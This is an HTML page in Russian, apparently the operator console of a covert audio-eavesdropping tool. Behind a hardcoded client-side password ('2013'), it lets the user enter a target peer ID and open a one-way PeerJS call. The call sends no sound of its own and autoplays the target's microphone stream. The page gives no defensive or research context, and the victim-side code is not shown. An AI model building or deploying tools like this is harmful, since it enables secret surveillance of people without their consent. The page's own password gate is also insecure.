<!DOCTYPE html>
<html>
<head>
    <title>ADMIN PANEL</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 50px; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px 0; width: 300px; }
        button { background: #0f0; border: none; padding: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div id="auth">
        <h2>Введите пароль:</h2>
        <input type="password" id="pass">
        <button onclick="login()">ВОЙТИ</button>
    </div>

    <div id="panel" style="display:none">
        <h2>Панель управления</h2>
        <input type="text" id="targetId" placeholder="Введите ID (например, user-1234)">
        <button onclick="startListen()">ПОДКЛЮЧИТЬСЯ</button>
        <p id="status">Статус: Ожидание...</p>
        <audio id="output" autoplay></audio>
    </div>

    <script>
        const peer = new Peer('admin-' + Math.floor(Math.random() * 999));

        function login() {
            if(document.getElementById('pass').value === '2013') {
                document.getElementById('auth').style.display = 'none';
                document.getElementById('panel').style.display = 'block';
            }
        }

        function startListen() {
            const target = document.getElementById('targetId').value;
            document.getElementById('status').innerText = "Подключение к " + target + "...";
            
            const call = peer.call(target, null); // Звоним без своего звука
            
            call.on('stream', (remoteStream) => {
                document.getElementById('output').srcObject = remoteStream;
                document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ ИДЕТ";
            });
        }
    </script>
</body>
</html>
